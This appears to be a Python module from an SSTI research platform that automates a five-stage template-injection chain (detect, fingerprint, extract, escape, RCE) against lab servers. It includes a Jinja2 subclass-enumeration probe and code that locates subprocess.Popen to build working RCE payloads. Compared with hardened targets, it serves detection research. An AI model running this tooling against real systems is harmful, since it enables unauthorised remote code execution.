"""Attack stage runner for RENDER SSTI research platform.

Orchestrates the 5-stage SSTI attack chain:
  DETECT -> FINGERPRINT -> EXTRACT -> ESCAPE -> RCE
"""

from __future__ import annotations

import asyncio
import re
import time
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Optional
from uuid import uuid4

import httpx

from detection.rules import evaluate_rules, DetectionResult
from engines.base import TemplateEngine, ProbePayload


# ─── Result models ────────────────────────────────────────────────────────────

@dataclass
class StageResult:
    """Result of running a single attack stage."""
    id: str = field(default_factory=lambda: str(uuid4()))
    stage: str = ""
    engine: str = ""
    target_url: str = ""
    mode: str = "vulnerable"

    # Outcome
    status: str = "unknown"        # success | failed | blocked | error | skipped
    payload_used: str = ""
    raw_response: str = ""
    response_time_ms: float = 0.0

    # Analysis
    evidence: dict = field(default_factory=dict)
    detection_result: Optional[DetectionResult] = None
    finding: Optional[dict] = None

    timestamp: str = field(
        default_factory=lambda: datetime.now(timezone.utc).isoformat()
    )
    error: Optional[str] = None

    def to_dict(self) -> dict:
        return {
            "id": self.id,
            "stage": self.stage,
            "engine": self.engine,
            "target_url": self.target_url,
            "mode": self.mode,
            "status": self.status,
            "payload_used": self.payload_used,
            "raw_response": self.raw_response,
            "response_time_ms": self.response_time_ms,
            "evidence": self.evidence,
            "detection_triggered": (
                self.detection_result.triggered if self.detection_result else False
            ),
            "rule_id": (
                self.detection_result.rule_id if self.detection_result else None
            ),
            "finding": self.finding,
            "timestamp": self.timestamp,
            "error": self.error,
        }


@dataclass
class ChainResult:
    """Result of running the full 5-stage attack chain."""
    id: str = field(default_factory=lambda: str(uuid4()))
    engine: str = ""
    target_url: str = ""
    mode: str = "vulnerable"
    stages: list[StageResult] = field(default_factory=list)
    findings: list[dict] = field(default_factory=list)
    timestamp: str = field(
        default_factory=lambda: datetime.now(timezone.utc).isoformat()
    )

    @property
    def summary(self) -> dict:
        status_counts: dict[str, int] = {}
        for s in self.stages:
            status_counts[s.status] = status_counts.get(s.status, 0) + 1
        return {
            "total_stages": len(self.stages),
            "status_counts": status_counts,
            "rce_achieved": any(
                s.stage == "rce" and s.status == "success" for s in self.stages
            ),
            "findings_count": len(self.findings),
        }

    def to_dict(self) -> dict:
        return {
            "id": self.id,
            "engine": self.engine,
            "target_url": self.target_url,
            "mode": self.mode,
            "stages": [s.to_dict() for s in self.stages],
            "findings": self.findings,
            "summary": self.summary,
            "timestamp": self.timestamp,
        }


# ─── Telemetry store (module-level, shared with API) ─────────────────────────

_telemetry_events: list[dict] = []
_findings_store: list[dict] = []


def get_telemetry() -> list[dict]:
    return list(reversed(_telemetry_events))


def get_findings() -> list[dict]:
    return list(_findings_store)


def add_finding(finding: dict) -> dict:
    _findings_store.append(finding)
    return finding


def delete_finding(finding_id: str) -> bool:
    global _findings_store
    original = len(_findings_store)
    _findings_store = [f for f in _findings_store if f.get("id") != finding_id]
    return len(_findings_store) < original


def clear_all() -> None:
    _telemetry_events.clear()
    _findings_store.clear()


# ─── RCE index probing ────────────────────────────────────────────────────────

_SUBPROCESS_PATTERN = re.compile(r"subprocess\.Popen|<class 'subprocess")
_SUBCLASS_INDEX_RANGE = range(350, 500)  # typical range; probed dynamically


async def _find_subprocess_index(
    client: httpx.AsyncClient,
    target_url: str,
    timeout: float,
) -> Optional[int]:
    """Try to find the subprocess.Popen class index in the subclasses list."""
    probe = "{{''.__class__.__mro__[1].__subclasses__()}}"
    try:
        resp = await client.post(
            target_url,
            json={"input": probe},
            timeout=timeout,
        )
        text = resp.text
        # Find 'subprocess' in the response and count commas to approximate index
        idx = text.find("subprocess.Popen")
        if idx == -1:
            return None
        prefix = text[:idx]
        # Count '<class' occurrences as proxy for index
        count = prefix.count("<class '")
        return count if count > 0 else None
    except Exception:
        return None


# ─── AttackRunner ─────────────────────────────────────────────────────────────

class AttackRunner:
    """Orchestrates SSTI attack stages against a target lab server."""

    DEFAULT_TIMEOUT = 10.0  # seconds

    def __init__(
        self,
        timeout: float = DEFAULT_TIMEOUT,
        telemetry_list: Optional[list] = None,
        findings_list: Optional[list] = None,
    ) -> None:
        self.timeout = timeout
        # Allow caller to provide their own lists (for API in-memory store)
        self._telemetry = telemetry_list if telemetry_list is not None else _telemetry_events
        self._findings = findings_list if findings_list is not None else _findings_store

    # ─── Internal HTTP helper ─────────────────────────────────────────────

    async def _post_payload(
        self,
        client: httpx.AsyncClient,
        target_url: str,
        payload: str,
    ) -> tuple[str, float]:
        """POST a payload to the lab server and return (response_text, ms)."""
        start = time.monotonic()
        resp = await client.post(
            target_url,
            json={"input": payload},
            timeout=self.timeout,
        )
        elapsed_ms = (time.monotonic() - start) * 1000
        # Labs return {"output": "..."} — extract the output field
        try:
            data = resp.json()
            return str(data.get("output", resp.text)), elapsed_ms
        except Exception:
            return resp.text, elapsed_ms

    # ─── Telemetry helpers ────────────────────────────────────────────────

    def _emit_telemetry(self, result: StageResult) -> dict:
        event = {
            "id": str(uuid4()),
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "stage": result.stage,
            "engine": result.engine,
            "target_url": result.target_url,
            "mode": result.mode,
            "status": result.status,
            "payload_used": result.payload_used,
            "response_excerpt": result.raw_response[:150],
            "detection_triggered": (
                result.detection_result.triggered if result.detection_result else False
            ),
            "rule_id": (
                result.detection_result.rule_id if result.detection_result else None
            ),
        }
        self._telemetry.append(event)
        return event

    def _make_finding(self, result: StageResult, det: DetectionResult) -> dict:
        finding: dict = {
            "id": str(uuid4()),
            "rule_id": det.rule_id,
            "rule_name": det.rule_name,
            "severity": det.severity,
            "engine": result.engine,
            "target_url": result.target_url,
            "stage": result.stage,
            "payload_used": result.payload_used,
            "evidence": det.evidence,
            "details": det.details,
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }
        self._findings.append(finding)
        return finding

    # ─── Stage runners ────────────────────────────────────────────────────

    async def run_stage(
        self,
        engine: TemplateEngine,
        target_url: str,
        stage: str,
        payload: Optional[str] = None,
        mode: str = "vulnerable",
    ) -> StageResult:
        """Run a single attack stage and return a StageResult.

        Args:
            engine: Engine definition with probe payloads.
            target_url: Full URL to the lab server.
            stage: One of detect | fingerprint | extract | escape | rce.
            payload: Optional specific payload to use. If None, use first probe.
            mode: "vulnerable" or "hardened" (metadata only).

        Returns:
            StageResult with status, evidence, and detection results.
        """
        result = StageResult(
            stage=stage,
            engine=engine.name,
            target_url=target_url,
            mode=mode,
        )

        # Pick payload
        probes = engine.get_probes_for_stage(stage)
        if not probes and payload is None:
            result.status = "skipped"
            result.error = f"No probes defined for stage '{stage}' on engine '{engine.name}'"
            return result

        selected_probe: Optional[ProbePayload] = None
        payload_str: str

        if payload:
            payload_str = payload
        elif probes:
            selected_probe = probes[0]
            payload_str = selected_probe.payload
        else:
            result.status = "skipped"
            return result

        result.payload_used = payload_str

        # Special case: Jinja2 RCE needs dynamic subclass index
        if (
            stage == "rce"
            and engine.name == "jinja2"
            and "__subclasses__()" in payload_str
            and "[400]" in payload_str
        ):
            async with httpx.AsyncClient() as client:
                idx = await _find_subprocess_index(client, target_url, self.timeout)
                if idx is not None:
                    payload_str = payload_str.replace("[400]", f"[{idx}]")
                    result.payload_used = payload_str

        # Send the request
        try:
            async with httpx.AsyncClient(follow_redirects=True) as client:
                raw, ms = await self._post_payload(client, target_url, payload_str)
        except httpx.ConnectError as e:
            result.status = "error"
            result.error = f"Cannot connect to {target_url}: {e}"
            self._emit_telemetry(result)
            return result
        except httpx.TimeoutException:
            result.status = "error"
            result.error = f"Request timed out after {self.timeout}s"
            self._emit_telemetry(result)
            return result
        except Exception as e:
            result.status = "error"
            result.error = str(e)
            self._emit_telemetry(result)
            return result

        result.raw_response = raw
        result.response_time_ms = ms

        # Analyse response
        det = evaluate_rules(stage, raw, payload_str, engine.name)
        result.detection_result = det

        if stage == "detect":
            if det.triggered:
                result.status = "success"
                result.evidence = {"math_result_found": True, "response": raw[:200]}
            else:
                result.status = "blocked" if mode == "hardened" else "failed"
                result.evidence = {"response_excerpt": raw[:200]}

        elif stage == "fingerprint":
            if det.triggered or engine.check_fingerprint(raw):
                result.status = "success"
                result.evidence = {
                    "engine_identified": engine.name,
                    "response_excerpt": raw[:200],
                }
                if not det.triggered:
                    det.triggered = True
                    det.rule_id = "RENDER-002"
                    det.rule_name = "Template Engine Fingerprinted"
                    det.severity = "high"
                    det.evidence = {
                        "engine_identified": engine.name,
                        "response_excerpt": raw[:200],
                    }
                result.detection_result = det
            else:
                result.status = "blocked" if mode == "hardened" else "failed"
                result.evidence = {"response_excerpt": raw[:200]}

        elif stage in ("extract", "escape"):
            # Success if response changed meaningfully from a plain echo
            if raw and payload_str not in raw and len(raw) > 2:
                result.status = "success"
                result.evidence = {"data_extracted": raw[:500]}
            else:
                result.status = "blocked" if mode == "hardened" else "failed"
                result.evidence = {"response_excerpt": raw[:200]}

        elif stage == "rce":
            if det.triggered:
                result.status = "success"
                result.evidence = {
                    "command_output": raw[:300],
                    "rce_confirmed": True,
                }
            else:
                result.status = "blocked" if mode == "hardened" else "failed"
                result.evidence = {"response_excerpt": raw[:300]}

        # Create finding if a rule fired
        if det and det.triggered:
            result.finding = self._make_finding(result, det)

        self._emit_telemetry(result)
        return result

    async def run_chain(
        self,
        engine: TemplateEngine,
        target_url: str,
        mode: str = "vulnerable",
    ) -> ChainResult:
        """Run the full 5-stage attack chain sequentially.

        Stages: detect → fingerprint → extract → escape → rce
        Aborts early if a non-detection stage fails in vulnerable mode.
        """
        chain = ChainResult(
            engine=engine.name,
            target_url=target_url,
            mode=mode,
        )

        stages_order = ["detect", "fingerprint", "extract", "escape", "rce"]

        for stage in stages_order:
            result = await self.run_stage(engine, target_url, stage, mode=mode)
            chain.stages.append(result)

            if result.finding:
                chain.findings.append(result.finding)

            # In vulnerable mode, stop chain early if detection or fingerprint fails
            # (no point trying RCE on a non-vulnerable target)
            if mode == "vulnerable" and stage in ("detect",) and result.status not in ("success",):
                # Attempt remaining stages anyway but mark as skipped if detect failed
                for remaining in stages_order[stages_order.index(stage) + 1:]:
                    skipped = StageResult(
                        stage=remaining,
                        engine=engine.name,
                        target_url=target_url,
                        mode=mode,
                        status="skipped",
                        error="Skipped: prior stage did not succeed",
                    )
                    chain.stages.append(skipped)
                break

        return chain

    async def run_compare(
        self,
        engine: TemplateEngine,
        payload: str,
        stage: str,
        vulnerable_url: str,
        hardened_url: str,
    ) -> dict:
        """Run the same payload against both vulnerable and hardened labs in parallel."""
        vuln_task = self.run_stage(
            engine, vulnerable_url, stage, payload=payload, mode="vulnerable"
        )
        hard_task = self.run_stage(
            engine, hardened_url, stage, payload=payload, mode="hardened"
        )

        vuln_result, hard_result = await asyncio.gather(vuln_task, hard_task)

        return {
            "engine": engine.name,
            "stage": stage,
            "payload": payload,
            "vulnerable": vuln_result.to_dict(),
            "hardened": hard_result.to_dict(),
            "comparison": {
                "vulnerable_status": vuln_result.status,
                "hardened_status": hard_result.status,
                "protection_effective": (
                    vuln_result.status == "success"
                    and hard_result.status in ("blocked", "failed")
                ),
            },
        }

    # ─── Sync wrappers (for CLI) ──────────────────────────────────────────

    def run_stage_sync(
        self,
        engine: TemplateEngine,
        target_url: str,
        stage: str,
        payload: Optional[str] = None,
        mode: str = "vulnerable",
    ) -> StageResult:
        return asyncio.run(self.run_stage(engine, target_url, stage, payload, mode))

    def run_chain_sync(
        self,
        engine: TemplateEngine,
        target_url: str,
        mode: str = "vulnerable",
    ) -> ChainResult:
        return asyncio.run(self.run_chain(engine, target_url, mode))

    def run_compare_sync(
        self,
        engine: TemplateEngine,
        payload: str,
        stage: str,
        vulnerable_url: str,
        hardened_url: str,
    ) -> dict:
        return asyncio.run(
            self.run_compare(engine, payload, stage, vulnerable_url, hardened_url)
        )
